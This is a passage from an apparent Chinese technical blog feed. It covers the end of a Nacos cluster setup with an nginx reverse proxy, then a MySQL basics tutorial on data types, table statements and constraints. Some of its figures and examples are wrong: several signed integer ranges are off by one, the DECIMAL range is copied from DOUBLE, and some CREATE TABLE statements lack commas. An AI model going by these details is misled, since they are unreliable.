class="hljs-string">jdbc:mysql://127.0.0.1:3306/nacos?characterEncoding=utf8&amp;connectTimeout=1000&amp;socketTimeout=3000&amp;autoReconnect=true&amp;useUnicode=true&amp;useSSL=false&amp;serverTimezone=UTC</span><br><span class="hljs-attr">db.user.0</span>=<span class="hljs-string">root</span><br><span class="hljs-attr">db.password.0</span>=<span class="hljs-string">123</span><br></code></pre></td></tr></table></figure><h2 id="5-4-启动"><a href="#5-4-启动" class="headerlink" title="5.4.启动"></a>5.4.启动</h2><p>将nacos文件夹复制三份，分别命名为：nacos1、nacos2、nacos3</p><p><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/202210182026235.png" alt="image-20210409213335538"> </p><p>然后分别修改三个文件夹中的application.properties，</p><p>nacos1:</p><figure class="highlight properties"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs properties"><span class="hljs-attr">server.port</span>=<span class="hljs-string">8845</span><br></code></pre></td></tr></table></figure><p>nacos2:</p><figure class="highlight properties"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs properties"><span class="hljs-attr">server.port</span>=<span class="hljs-string">8846</span><br></code></pre></td></tr></table></figure><p>nacos3:</p><figure class="highlight properties"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs properties"><span class="hljs-attr">server.port</span>=<span class="hljs-string">8847</span><br></code></pre></td></tr></table></figure><p>然后分别启动三个nacos节点：</p><figure class="highlight dos"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs dos">startup.<span class="hljs-built_in">cmd</span><br></code></pre></td></tr></table></figure><h2 id="5-5-nginx反向代理"><a href="#5-5-nginx反向代理" class="headerlink" title="5.5.nginx反向代理"></a>5.5.nginx反向代理</h2><p><a href="https://pan.baidu.com/s/11_5gu_SHtpUADkHu0t3TyA?pwd=52lj">下载nginx安装包</a>： </p><p><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/image-20221123092819398.png"></p><p>解压到任意非中文目录下：</p><p><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/202210182026237.png" alt="image-20210410103322874"> </p><p>修改conf&#x2F;nginx.conf文件，配置如下：</p><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs nginx"><span class="hljs-section">upstream</span> nacos-cluster &#123;<br>    <span class="hljs-attribute">server</span> <span class="hljs-number">127.0.0.1:8845</span>;<br><span class="hljs-attribute">server</span> <span class="hljs-number">127.0.0.1:8846</span>;<br><span class="hljs-attribute">server</span> <span class="hljs-number">127.0.0.1:8847</span>;<br>&#125;<br><br><span class="hljs-section">server</span> &#123;<br>    <span class="hljs-attribute">listen</span>       <span class="hljs-number">80</span>;<br>    <span class="hljs-attribute">server_name</span>  localhost;<br><br>    <span class="hljs-section">location</span> /nacos &#123;<br>        <span class="hljs-attribute">proxy_pass</span> http://nacos-cluster;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>而后在浏览器访问：<a href="http://localhost/nacos%E5%8D%B3%E5%8F%AF%E3%80%82">http://localhost/nacos即可。</a></p><p>代码中application.yml文件配置如下：</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs yaml"><span class="hljs-attr">spring:</span><br>  <span class="hljs-attr">cloud:</span><br>    <span class="hljs-attr">nacos:</span><br>      <span class="hljs-attr">server-addr:</span> <span class="hljs-string">localhost:80</span> <span class="hljs-comment"># Nacos地址</span><br></code></pre></td></tr></table></figure><h2 id="5-6-优化"><a href="#5-6-优化" class="headerlink" title="5.6.优化"></a>5.6.优化</h2><ul><li><p>实际部署时，需要给做反向代理的nginx服务器设置一个域名，这样后续如果有服务器迁移nacos的客户端也无需更改配置.</p></li><li><p>Nacos的各个节点应该部署到多个不同服务器，做好容灾和隔离</p></li></ul><h2 id="5-7-可能遇到的问题"><a href="#5-7-可能遇到的问题" class="headerlink" title="5.7 可能遇到的问题"></a>5.7 可能遇到的问题</h2><h3 id="集群启动失败"><a href="#集群启动失败" class="headerlink" title="集群启动失败"></a>集群启动失败</h3><blockquote><p>现象</p></blockquote><p>启动了两台之后第三台总是闪退，&#x3D;&#x3D;cmd&#x3D;&#x3D;窗口闪退</p><blockquote><p>原因</p></blockquote><p>内存不足</p><blockquote><p>解决</p></blockquote><p>一看<code>startup.cmd</code>启动文件</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs routeros"><span class="hljs-built_in">set</span> <span class="hljs-string">&quot;NACOS_JVM_OPTS=-server -Xms2g -Xmx2g -Xmn1g</span><br><span class="hljs-string"></span><br></code></pre></td></tr></table></figure><p>解释</p><figure class="highlight diff"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs diff"><span class="hljs-deletion">-Xmx2g:设置JVM最大可用内存为2g</span><br><span class="hljs-deletion">-Xmn1g:设置年轻代大小为1G.整个堆大小=年轻代大小 + 年老代大小 + 持久代大小.持久代一般固定大小为64m,所以增大年轻代后,将会减小年老代大小.此值对系统性能影响较大,Sun官方推荐配置为整个堆的3/8.</span><br><span class="hljs-deletion">-Xms2g:设置JVM促使内存为2g.此值可以设置与-Xmx相同,以避免每次垃圾回收完成后JVM重新分配内存.</span><br></code></pre></td></tr></table></figure><p>修改为</p><figure class="highlight diff"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs diff"><span class="hljs-deletion">-Xms512m -Xmx512m -Xmn256m</span><br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>Java</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Nacos</tag>
      
      <tag>微服务</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>MySQL</title>
    <link href="/2022/11/22/MySQL/"/>
    <url>/2022/11/22/MySQL/</url>
    
    <content type="html"><![CDATA[<h1 id="MySQL"><a href="#MySQL" class="headerlink" title="MySQL"></a>MySQL</h1><h1 id="一、SQL简述"><a href="#一、SQL简述" class="headerlink" title="一、SQL简述"></a>一、SQL简述</h1><h2 id="1-SQL的概述"><a href="#1-SQL的概述" class="headerlink" title="1.SQL的概述"></a>1.SQL的概述</h2><p>Structure Query<br>Language(结构化查询语言)简称SQL，它被美国国家标准局(ANSI)确定为关系型数据库语言的美国标准，后被国际化标准组织(ISO)采纳为关系数据库语言的国际标准。数据库管理系统可以通过SQL管理数据库；定义和操作数据，维护数据的完整性和安全性。</p><h2 id="2-SQL的优点"><a href="#2-SQL的优点" class="headerlink" title="2.SQL的优点"></a>2.SQL的优点</h2><p>1、简单易学，具有很强的操作性<br>2、绝大多数重要的数据库管理系统均支持SQL<br>3、高度非过程化；用SQL操作数据库时大部分的工作由DBMS自动完成</p><h2 id="3-SQL的分类"><a href="#3-SQL的分类" class="headerlink" title="3.SQL的分类"></a>3.SQL的分类</h2><p>1、DDL(Data Definition Language) 数据定义语言，用来操作数据库、表、列等； 常用语句：CREATE、 ALTER、DROP<br>2、DML(Data Manipulation Language) 数据操作语言，用来操作数据库中表里的数据；常用语句：INSERT、 UPDATE、<br>DELETE<br>3、DCL(Data Control Language) 数据控制语言，用来操作访问权限和安全级别； 常用语句：GRANT、DENY<br>4、DQL(Data Query Language) 数据查询语言，用来查询数据 常用语句：SELECT</p><h1 id="二、数据库的三大范式"><a href="#二、数据库的三大范式" class="headerlink" title="二、数据库的三大范式"></a>二、数据库的三大范式</h1><p>1、第一范式(1NF)是指数据库表的每一列都是不可分割的基本数据线；也就是说：每列的值具有原子性，不可再分割。<br>2、第二范式(2NF)是在第一范式(1NF)的基础上建立起来得，满足第二范式(2NF)必须先满足第一范式(1NF)。如果表是单主键，那么主键以外的列必须完全依赖于主键；如果表是复合主键，那么主键以外的列必须完全依赖于主键，不能仅依赖主键的一部分。<br>3、第三范式(3NF)是在第二范式的基础上建立起来的，即满足第三范式必须要先满足第二范式。第三范式(3NF)要求：表中的非主键列必须和主键直接相关而不能间接相关；也就是说：非主键列之间不能相关依赖。</p><h1 id="三、数据库的数据类型"><a href="#三、数据库的数据类型" class="headerlink" title="三、数据库的数据类型"></a>三、数据库的数据类型</h1><p>使用MySQL数据库存储数据时，不同的数据类型决定了<br>MySQL存储数据方式的不同。为此，MySQL数据库提供了多种数据类型，其中包括整数类型、浮点数类型、定点<br>数类型、日期和时间类型、字符串类型、二进制…等等数据类型。</p><h2 id="1-整数类型"><a href="#1-整数类型" class="headerlink" title="1.整数类型"></a>1.整数类型</h2><p>根据数值取值范围的不同MySQL 中的整数类型可分为5种，分别是TINYINT、SMALUNT、MEDIUMINT、INT和 BIGINT。下图列举了<br>MySQL不同整数类型所对应的字节大小和取值范围而最常用的为INT类型的，</p><table><thead><tr><th>数据类型</th><th>字节数</th><th>无符号数的取值范围</th><th>有符号数的取值范围</th></tr></thead><tbody><tr><td>TINYINT</td><td>1</td><td>0~255</td><td>-128~127</td></tr><tr><td>SMALLINT</td><td>2</td><td>0~65535</td><td>-32768~32768</td></tr><tr><td>MEDIUMINT</td><td>3</td><td>0~16777215</td><td>-8388608~8388608</td></tr><tr><td>INT</td><td>4</td><td>0~4294967295</td><td>-2147483648~ 2147483648</td></tr><tr><td>BIGINT</td><td>8</td><td>0~18446744073709551615</td><td>-9223372036854775808~9223372036854775808</td></tr></tbody></table><h2 id="2-浮点数类型和定点数类型"><a href="#2-浮点数类型和定点数类型" class="headerlink" title="2.浮点数类型和定点数类型"></a>2.浮点数类型和定点数类型</h2><p>在MySQL数据库中使用浮点数和定点数来存储小数。浮点数的类型有两种：单精度浮点数类型（FLOAT)和双精度浮点数类型（DOUBLE)。而定点数类型只有一种即DECIMAL类型。下图列举了<br>MySQL中浮点数和定点数类型所对应的字节大小及其取值范围：</p><table><thead><tr><th>数据类型</th><th>字节数</th><th>有符号的取值范围</th><th>无符号的取值范围</th></tr></thead><tbody><tr><td>FLOAT</td><td>4</td><td>-3.402823466E+38~-1.175494351E-38</td><td>0和1.175494351E-38~3.402823466E+38</td></tr><tr><td>DOUBLE</td><td>8</td><td>-1.7976931348623157E+308~2.2250738585072014E-308</td><td>0和2.2250738585072014E-308~1.7976931348623157E+308</td></tr><tr><td>DECIMAL（M,D）</td><td>M+2</td><td>-1.7976931348623157E+308~2.2250738585072014E-308</td><td>0和2.2250738585072014E-308~1.7976931348623157E+308</td></tr></tbody></table><p>从上图中可以看出：DECIMAL类型的取值范围与DOUBLE类型相同。但是，请注意：DECIMAL类型的有效取值范围是由M和D决定的。其中，M表示的是数据的长<br>度，D表示的是小数点后的长度。比如，将数据类型为DECIMAL(6,2)的数据6.5243 插人数据库后显示的结果为6.52</p><h2 id="3-字符串类型"><a href="#3-字符串类型" class="headerlink" title="3.字符串类型"></a>3.字符串类型</h2><p>在MySQL中常用CHAR 和 VARCHAR 表示字符串。两者不同的是：VARCHAR存储可变长度的字符串。<br><strong>当数据为CHAR(M)类型时，不管插入值的长度是实际是多少它所占用的存储空间都是M个字节；而VARCHAR(M)所对应的数据所占用的字节数为实际长度加1</strong></p><table><thead><tr><th>插入值</th><th>CHAR(3)</th><th>存储需求</th><th>VARCHAR(3)</th><th>存储需求</th></tr></thead><tbody><tr><td>‘’</td><td>‘’</td><td>3个字节</td><td>‘’</td><td>1个字节</td></tr><tr><td>‘a’</td><td>‘a’</td><td>3个字节</td><td>‘a’</td><td>2个字节</td></tr><tr><td>‘ab’</td><td>‘ab’</td><td>3个字节</td><td>‘ab’</td><td>3个字节</td></tr><tr><td>‘abc’</td><td>‘ab’</td><td>3个字节</td><td>‘abc’</td><td>4个字节</td></tr><tr><td>‘abcd’</td><td>‘ab’</td><td>3个字节</td><td>‘abc’</td><td>4字节</td></tr></tbody></table><h2 id="4-字符串类型"><a href="#4-字符串类型" class="headerlink" title="4.字符串类型"></a>4.字符串类型</h2><p>文本类型用于表示大文本数据，例如，文章内容、评论、详情等，它的类型分为如下4种：</p><table><thead><tr><th>数据类型</th><th>储存范围</th></tr></thead><tbody><tr><td>TINYTEXT</td><td>0~255字节</td></tr><tr><td>TEXT</td><td>0~65535字节</td></tr><tr><td>MEDIUMTEXT</td><td>0~16777215字节</td></tr><tr><td>LONGTEXT</td><td>0~4294967295字节</td></tr></tbody></table><h2 id="5-日期与时间类型"><a href="#5-日期与时间类型" class="headerlink" title="5.日期与时间类型"></a>5.日期与时间类型</h2><p>MySQL提供的表示日期和时间的数据类型分别是 ：YEAR、DATE、TIME、DATETIME 和<br>TIMESTAMP。下图列举了日期和时间数据类型所对应的字节数、取值范围、日期格式以及零值：</p><table><thead><tr><th>数据类型</th><th>字节数</th><th>取值范围</th><th>日期格式</th><th>零值</th></tr></thead><tbody><tr><td>YEAR</td><td>1</td><td>1901~2155</td><td>YYYY</td><td>0000</td></tr><tr><td>DATE</td><td>4</td><td>1000-01-01~9999-12-31</td><td>YYYY-MM-DD</td><td>0000-00-00</td></tr><tr><td>TIME</td><td>3</td><td>-838：59：59~ 838：59：59</td><td>HH:MM:SS</td><td>00:00:00</td></tr><tr><td>DATETIME</td><td>8</td><td>1000-01-01 00:00:00~9999-12-31 23:59:59</td><td>YYYY-MM-DD HH:MM:SS</td><td>0000-00-00 00:00:00</td></tr><tr><td>TIMESTAMP</td><td>4</td><td>1970-01-01 00:00:01~2038-01-19 03:14:07</td><td>YYYY-MM-DD HH:MM:SS</td><td>0000-00-00 00:00:00</td></tr></tbody></table><h3 id="5-1-YEAR类型"><a href="#5-1-YEAR类型" class="headerlink" title="5.1 YEAR类型"></a>5.1 YEAR类型</h3><p>YEAR类型用于表示年份，在MySQL中，可以使用以下三种格式指定YEAR类型 的值。<br>1、使用4位字符串或数字表示，范围为’1901’—‘2155’或1901—2155。例如，输人 ‘2019’或2019插人到数据库中的值均为2019。<br>2、使用两位字符串表示，范围为’00’—‘99’。其中，‘00’—‘69’范围的值会被转换为<br>2000—2069范围的YEAR值，‘70’—‘99’范围的值会被转换为1970—1999范围的YEAR<br>值。例如，输人’19’插人到数据库中的值为2019。<br>3、使用两位数字表示，范围为1—99。其中，1—69范围的值会被转换为2001—<br>2069范围的YEAR值，70—99范围的值会被转换为1970—1999范围的YEAR值。例 如，输人19插入到数据库中的值为2019。<br><strong>请注意 ：当使用YEAR类型时，一定要区分’0’和0。因为字符串格式的’0’表示的YEAR值是2000而数字格式的0表示的YEAR值是0000。</strong></p><h3 id="5-2-TIME类型"><a href="#5-2-TIME类型" class="headerlink" title="5.2 TIME类型"></a>5.2 TIME类型</h3><p>TIME类型用于表示时间值，它的显示形式一般为HH:MM:SS，其中，HH表示小时，<br>MM表示分,SS表示秒。在MySQL中，可以使用以下3种格式指定TIME类型的值。  </p><ol><li><p>以’D HH:MM:SS’字符串格式表示。其中，D表示日可取0—34之间的值, 插人数据时，小时的值等于(DX24+HH)。例如，输入’2<br>11:30:50’插人数据库中的日期为59:30:50。  </p></li><li><p>以’HHMMSS’字符串格式或者HHMMSS数字格式表示。 例如，输人’115454’或115454,插入数据库中的日期为11:54:54  </p></li><li><p>使用CURRENT_TIME或NOW()输人当前系统时间。</p></li></ol><h3 id="5-3-DATETIME类型"><a href="#5-3-DATETIME类型" class="headerlink" title="5.3 DATETIME类型"></a>5.3 DATETIME类型</h3><p>DATETIME类型用于表示日期和时间，它的显示形式为’YYYY-MM-DD HH:<br>MM:SS’，其中，YYYY表示年，MM表示月，DD表示日，HH表示小时，MM表示分，SS<br>表示秒。在MySQL中，可以使用以下4种格式指定DATETIME类型的值。<br>以’YYYY-MM-DD HH:MM:SS’或者’YYYYMMDDHHMMSS’字符串格式表示的日期和时间，取值范围为’1000-01-0100:00:00’—‘9999-12-3 23:59:59’。例如，输人’2019-01-22 09:01:23’或<br>‘20140122_0_90123’插人数据库中的 DATETIME 值都为 2019-01-22 09:01:23。  </p><ol><li>以’YY-MM-DD<br>HH:MM:SS’或者’YYMMDDHHMMSS’字符串格式表示的日期和时间，其中YY表示年，取值范围为’00’—‘99’。与DATE类型中的YY相同，‘00’—<br>‘69’范围的值会被转换为2000—2069范围的值，‘70’—‘99’范围的值会被转换为1970—1999范围的值。  </li><li>以YYYYMMDDHHMMSS或者YYMMDDHHMMSS数字格式表示的日期<br>和时间。例如，插入20190122090123或者190122090123,插人数据库中的DATETIME值都 为 2019-01-22 09:01:23。  </li><li>使用NOW来输人当前系统的日期和时间。</li></ol><h3 id="5-4-TIMESTAMP类型"><a href="#5-4-TIMESTAMP类型" class="headerlink" title="5.4 TIMESTAMP类型"></a>5.4 TIMESTAMP类型</h3><p>TIMESTAMP类型用于表示日期和时间，它的显示形式与DATETIME相同但取值范围比DATETIME小。在此，介绍几种TIMESTAMP类型与DATATIME类型不同的形式：<br>1、使用CURRENT_TIMESTAMP输人系统当前日期和时间。<br>2、输人NULL时系统会输人系统当前日期和时间。<br>3、无任何输人时系统会输入系统当前日期和时间。</p><h2 id="6-二进制类型"><a href="#6-二进制类型" class="headerlink" title="6.二进制类型"></a>6.二进制类型</h2><p>在MySQL中常用BLOB存储二进制类型的数据，例如：图片、PDF文档等。BLOB类型分为如下四种：</p><table><thead><tr><th>数据类型</th><th>储存范围</th></tr></thead><tbody><tr><td>TINYBLOB</td><td>0~255字节</td></tr><tr><td>BLOB</td><td>0~65535字节</td></tr><tr><td>MEDIUMBLOB</td><td>0~16777215字节</td></tr><tr><td>LONGBLOB</td><td>0~4294967295字节</td></tr></tbody></table><h1 id="四、数据库、数据表的基本操作"><a href="#四、数据库、数据表的基本操作" class="headerlink" title="四、数据库、数据表的基本操作"></a>四、数据库、数据表的基本操作</h1><h2 id="1-数据库的基本操作"><a href="#1-数据库的基本操作" class="headerlink" title="1.数据库的基本操作"></a>1.数据库的基本操作</h2><p>MySQL安装完成后，要想将数据存储到数据库的表中，首先要创建一个数据库。创 建数据库就是在数据库系统中划分一块空间存储数据，语法如下：</p><p>   <code> create database 数据库名称;</code></p><p>创建一个叫db1的数据库MySQL命令：</p><p>​    – 创建一个叫db1的数据库<br>​   <code> show create database db1;</code></p><p>运行效果展示：<br><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/2021030312520741.png" alt="在这里插入图片描述"><br>创建数据库后查看该数据库基本信息MySQL命令：</p><p>   <code> show create database db1;</code></p><p>运行效果展示：<br><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/20210303125330974.png" alt="在这里插入图片描述"><br>删除数据库MySQL命令：</p><p>  <code>drop database db1;</code></p><p>运行效果展示：<br><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/20210303125647454.png" alt="在这里插入图片描述"><br>查询出MySQL中所有的数据库MySQL命令：</p><p>​    <code>show databases;</code></p><p>运行效果展示：<br><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/20210303125940965.png" alt="在这里插入图片描述"><br>将数据库的字符集修改为gbk MySQL命令：</p><p>  <code>  alter database db1 character set gbk;</code></p><p>运行效果展示：<br><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/20210303130330527.png" alt="在这里插入图片描述"><br>切换数据库 MySQL命令：</p><p>  <code>  use db1;</code></p><p>运行效果展示：<br><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/20210303130451230.png" alt="在这里插入图片描述"><br>查看当前使用的数据库 MySQL命令：</p><p>​    <code>select database();</code></p><p>运行效果展示：<br><img src="https://img-blog.csdnimg.cn/20210303130616683.png" alt="在这里插入图片描述"></p><h2 id="2-数据表的基本操作"><a href="#2-数据表的基本操作" class="headerlink" title="2.数据表的基本操作"></a>2.数据表的基本操作</h2><p>数据库创建成功后可在该数据库中创建数据表(简称为表)存储数据。请注意：在操作数据表之前应使用“USE<br>数据库名;”指定操作是在哪个数据库中进行先关操作，否则会抛出“No database selected”错误。<br>语法如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs mysql"> create table 表名(<br>         字段1 字段类型,<br>         字段2 字段类型,<br>         …<br>         字段n 字段类型<br>);<br></code></pre></td></tr></table></figure><h3 id="2-1-创建数据表"><a href="#2-1-创建数据表" class="headerlink" title="2.1 创建数据表"></a>2.1 创建数据表</h3><p>示例：创建学生表 MySQL命令：</p>   <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs mysql">create table student(<br>  id int,<br>   name varchar(20),<br>   gender varchar(10),<br>   birthday date<br>);<br></code></pre></td></tr></table></figure><p>运行效果展示：<br><img src="https://img-blog.csdnimg.cn/20210303140044367.png" alt="在这里插入图片描述"></p><h3 id="2-2-查看数据表"><a href="#2-2-查看数据表" class="headerlink" title="2.2 查看数据表"></a>2.2 查看数据表</h3><p>示例：查看当前数据库中所有表 MySQL命令：</p><p>​    <code>show tables;</code></p><p>运行效果展示：<br><img src="https://img-blog.csdnimg.cn/20210303144745383.png" alt="在这里插入图片描述"><br>示例：查表的基本信息 MySQL命令：</p><p>​    <code>show create table student;</code></p><p>运行效果展示：<br><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/20210303144940575.png" alt="在这里插入图片描述"><br>示例：查看表的字段信息 MySQL命令：</p><p>​    <code>desc student;</code></p><p>运行效果展示：<br><img src="https://img-blog.csdnimg.cn/20210303145223522.png" alt="在这里插入图片描述"></p><h3 id="2-3-修改数据表"><a href="#2-3-修改数据表" class="headerlink" title="2.3 修改数据表"></a>2.3 修改数据表</h3><p>有时，希望对表中的某些信息进行修改，例如：修改表名、修改字段名、修改字段 数据类型…等等。在MySQL中使用alter table修改数据表.<br>示例：修改表名 MySQL命令：</p><p>​    <code>alter table student rename to stu;</code></p><p>运行效果展示：<br><img src="https://img-blog.csdnimg.cn/20210303145645914.png" alt="在这里插入图片描述"><br>示例：修改字段名 MySQL命令：</p><p>​    <code>alter table stu change name sname varchar(10);</code></p><p>运行效果展示：<br><img src="https://img-blog.csdnimg.cn/20210303150127793.png" alt="在这里插入图片描述"><br>示例：修改字段数据类型 MySQL命令：</p><p>​    <code>alter table stu modify sname int;</code></p><p>运行效果展示：<br><img src="https://img-blog.csdnimg.cn/20210303150426652.png" alt="在这里插入图片描述"><br>示例：增加字段 MySQL命令：</p><p>​    <code>alter table stu add address varchar(50);</code></p><p>运行效果展示：<br><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/20210303150757176.png" alt="在这里插入图片描述"><br>示例：删除字段 MySQL命令：</p><p>​    <code>alter table stu drop address;</code></p><p>运行效果展示：</p><p><img src="https://img-blog.csdnimg.cn/20210303151816445.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NTg1MTk0NQ==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><h3 id="2-4-删除数据表"><a href="#2-4-删除数据表" class="headerlink" title="2.4 删除数据表"></a>2.4 删除数据表</h3><p>语法：</p><p>​    <code>drop table 表名;</code></p><p>示例：删除数据表 MySQL命令：</p><p>​    <code>drop table stu;</code></p><p>运行效果展示：</p><p><img src="https://img-blog.csdnimg.cn/20210303152039101.png" alt="在这里插入图片描述"></p><h1 id="五、数据表的约束"><a href="#五、数据表的约束" class="headerlink" title="五、数据表的约束"></a>五、数据表的约束</h1><p>为防止错误的数据被插入到数据表，MySQL中定义了一些维护数据库完整性的规则；这些规则常称为表的约束。常见约束如下：</p><table><thead><tr><th>约束条件</th><th>说明</th></tr></thead><tbody><tr><td>PRIMARY KEY</td><td>主键约束用于唯一标识对应的记录</td></tr><tr><td>FOREIGN KEY</td><td>外键约束</td></tr><tr><td>NOT NULL</td><td>非空约束</td></tr><tr><td>UNIQUE</td><td>唯一性约束</td></tr><tr><td>DEFAULT</td><td>默认值约束，用于设置字段的默认值</td></tr></tbody></table><p>以上五种约束条件针对表中字段进行限制从而保证数据表中数据的正确性和唯一性。换句话说，表的约束实际上就是表中数据的限制条件。</p><h2 id="1-主键约束"><a href="#1-主键约束" class="headerlink" title="1.主键约束"></a>1.主键约束</h2><p>主键约束即primary<br>key用于唯一的标识表中的每一行。被标识为主键的数据在表中是唯一的且其值不能为空。这点类似于我们每个人都有一个身份证号，并且这个身份证号是唯一的。<br>主键约束基本语法：</p><p>​    <code>字段名 数据类型 primary key;</code></p><p><strong>设置主键约束(primary key)的第一种方式</strong><br>示例：MySQL命令：</p>   <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs mysql">create table student(<br>id int primary key,<br>name varchar(20)<br>);<br><br></code></pre></td></tr></table></figure><p>运行效果展示：<br><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/20210303161028430.png" alt="在这里插入图片描述"><br><strong>设置主键约束(primary key)的第二·种方式</strong><br>示例：MySQL命令：</p>   <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs mysql">create table student01(<br>id int<br>name varchar(20),<br>primary key(id)<br>);<br><br></code></pre></td></tr></table></figure><p>运行效果展示：<br><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/20210303173104926.png" alt="在这里插入图片描述"></p><h2 id="2-非空约束"><a href="#2-非空约束" class="headerlink" title="2.非空约束"></a>2.非空约束</h2><p>非空约束即 NOT NULL指的是字段的值不能为空，基本的语法格式如下所示：</p><p>​<br>​    字段名 数据类型 NOT NULL;</p><p>示例：MySQL命令：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs mysql">create table student02(<br>id int<br>name varchar(20) not null<br>);<br></code></pre></td></tr></table></figure><p>运行效果展示：<br><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/2021030317340097.png" alt="在这里插入图片描述"></p><h2 id="3-默认值约束"><a href="#3-默认值约束" class="headerlink" title="3.默认值约束"></a>3.默认值约束</h2><p>默认值约束即DEFAULT用于给数据表中的字段指定默认值，即当在表中插入一条新记录时若未给该字段赋值，那么，数据库系统会自动为这个字段插人默认值；其基本的语法格式如下所示：</p><p>​<br>​    字段名 数据类型 DEFAULT 默认值；</p><p>示例：MySQL命令：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs mysql">create table student03(<br>id int,<br>name varchar(20),<br>gender varchar(10) default &#x27;male&#x27;<br>)<br></code></pre></td></tr></table></figure><p>运行效果展示：<br><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/20210303173835546.png" alt="在这里插入图片描述"></p><h2 id="5-唯一性约束"><a href="#5-唯一性约束" class="headerlink" title="5.唯一性约束"></a>5.唯一性约束</h2><p>唯一性约束即UNIQUE用于保证数据表中字段的唯一性，即表中字段的值不能重复出现，其基本的语法格式如下所示：</p><p>​    <code>字段名 数据类型 UNIQUE;</code></p><p>示例：MySQL命令：</p><p>​    </p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs mysql">create table student04(<br>  id int,<br>   name varchar(20) unique<br>   );<br></code></pre></td></tr></table></figure><p>运行效果展示：<br><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/20210303174216204.png" alt="在这里插入图片描述"></p><h2 id="6-外键约束"><a href="#6-外键约束" class="headerlink" title="6.外键约束"></a>6.外键约束</h2><p>外键约束即FOREIGN KEY常用于多张表之间的约束。基本语法如下：</p><p>​<br>​    – 在创建数据表时语法如下：<br>​    CONSTRAINT 外键名 FOREIGN KEY (从表外键字段) REFERENCES 主表 (主键字段)<br>​    – 将创建数据表创号后语法如下：<br>​    ALTER TABLE 从表名 ADD CONSTRAINT 外键名 FOREIGN KEY (从表外键字段) REFERENCES 主表 (主键字段);</p><p>示例：创建一个学生表 MySQL命令：</p>  <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs mysql">create table student05(<br>id int primary key,<br>name varchar(20)<br>);<br><br></code></pre></td></tr></table></figure><p>示例：创建一个班级表 MySQL命令：</p>   <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs mysql">create 